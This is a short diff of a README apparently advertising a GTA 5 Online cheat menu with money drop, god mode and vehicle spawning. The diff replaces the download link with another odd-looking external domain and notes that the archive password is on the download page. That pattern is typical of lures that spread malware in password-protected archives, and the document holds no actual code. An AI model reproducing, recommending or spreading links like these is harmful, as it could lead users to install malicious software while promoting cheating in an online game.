@@ -18,7 +18,7 @@ GTA 5 Online external mod menu — money drop, god mode, and vehicle spawner.
 
 ## Download
 
-[![Download v1.69](https://img.shields.io/badge/Download_v1.69-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/gta5modmenu3)
+[![Download v1.69](https://img.shields.io/badge/Download_v1.69-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/gta5modmenu3)
 
 > The archive password is shown on the download page.
 
